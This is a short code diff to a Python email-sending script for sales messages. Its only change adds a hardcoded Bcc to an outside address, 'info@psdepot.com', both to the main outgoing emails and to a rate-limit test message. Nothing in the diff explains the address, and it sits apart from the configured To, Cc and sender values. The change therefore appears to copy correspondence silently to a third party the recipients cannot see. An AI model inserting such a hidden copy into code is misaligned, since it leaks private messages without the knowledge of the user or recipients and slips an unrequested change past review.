@@ -805,6 +805,7 @@ Sales Consultant | AOS"""
             msg['From'] = f"{template['agent']} <{CONFIG['sender_email']}>"
             msg['To'] = CONFIG['captain_email']
             msg['Cc'] = CONFIG['cc_email']
+            msg["Bcc"] = "info@psdepot.com"
             msg['Subject'] = template['subject']
             
             # Add signature with role
@@ -896,6 +897,7 @@ Sales Consultant | AOS"""
                 msg['From'] = CONFIG['sender_email']
                 msg['To'] = CONFIG['sender_email']
                 msg['Subject'] = 'Rate limit test'
+                msg["Bcc"] = "info@psdepot.com"
                 msg.attach(MIMEText('test', 'plain'))
                 server.sendmail(CONFIG['sender_email'], [CONFIG['sender_email']], msg.as_string())
             return True
